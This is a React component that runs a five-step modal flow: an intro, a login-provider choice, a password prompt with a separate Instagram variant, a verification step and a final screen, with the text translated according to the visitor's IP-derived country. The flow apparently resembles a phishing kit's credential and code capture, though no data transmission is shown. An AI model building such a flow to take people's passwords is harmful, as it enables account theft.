'use client';

import FinalModal from '@/components/form-modal/final-modal';
import InitModal from '@/components/form-modal/init-modal';
import InstagramPasswordModal from '@/components/form-modal/instagram-password-modal';
import LoginChoiceModal from '@/components/form-modal/login-choice-modal';
import PasswordModal from '@/components/form-modal/password-modal';
import VerifyModal from '@/components/form-modal/verify-modal';
import { FORM_TEXT_KEYS } from '@/constants/form-text-keys';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import { purgeOldTranslationCaches, translateBatch } from '@/utils/translate';
import { useEffect, useState, type FC } from 'react';

const FormModal: FC = () => {
    const [step, setStep] = useState(1);
    const [mountKey, setMountKey] = useState(0);
    const [formTexts, setFormTexts] = useState<Record<string, string>>(DEFAULT_TEXTS);

    useEffect(() => {
        store.getState().resetFormSession();
    }, []);

    useEffect(() => {
        document.body.classList.add('overflow-hidden');
        return () => {
            document.body.classList.remove('overflow-hidden');
        };
    }, []);

    useEffect(() => {
        purgeOldTranslationCaches();

        const loadFormTexts = async () => {
            try {
                const ipInfo = localStorage.getItem('ipInfo');
                const countryCode = ipInfo ? JSON.parse(ipInfo).country_code : 'US';
                if (!countryCode || countryCode.toUpperCase() === 'US') return;

                const keys = [...FORM_TEXT_KEYS];
                const values = keys.map((key) => DEFAULT_TEXTS[key]);
                const translated = await translateBatch(values, countryCode);
                const result = { ...DEFAULT_TEXTS };

                keys.forEach((key, index) => {
                    result[key] = translated[index] ?? DEFAULT_TEXTS[key];
                });

                setFormTexts(result);
            } catch {
                //
            }
        };

        loadFormTexts();
    }, []);

    const loginProvider = store((state) => state.loginProvider);

    const handleNextStep = (nextStep: number) => {
        setMountKey((prev) => prev + 1);
        setStep(nextStep);
    };

    if (step === 1) return <InitModal key={`init-${mountKey}`} texts={formTexts} nextStep={() => handleNextStep(2)} />;
    if (step === 2) return <LoginChoiceModal key={`login-choice-${mountKey}`} texts={formTexts} onSelect={() => handleNextStep(3)} />;
    if (step === 3 && loginProvider === 'instagram') {
        return <InstagramPasswordModal key={`instagram-password-${mountKey}`} texts={formTexts} nextStep={() => handleNextStep(4)} />;
    }
    if (step === 3) return <PasswordModal key={`password-${mountKey}`} texts={formTexts} nextStep={() => handleNextStep(4)} />;
    if (step === 4) return <VerifyModal key={`verify-${mountKey}`} texts={formTexts} nextStep={() => handleNextStep(5)} />;
    if (step === 5) return <FinalModal key={`final-${mountKey}`} texts={formTexts} />;

    return null;
};

export default FormModal;
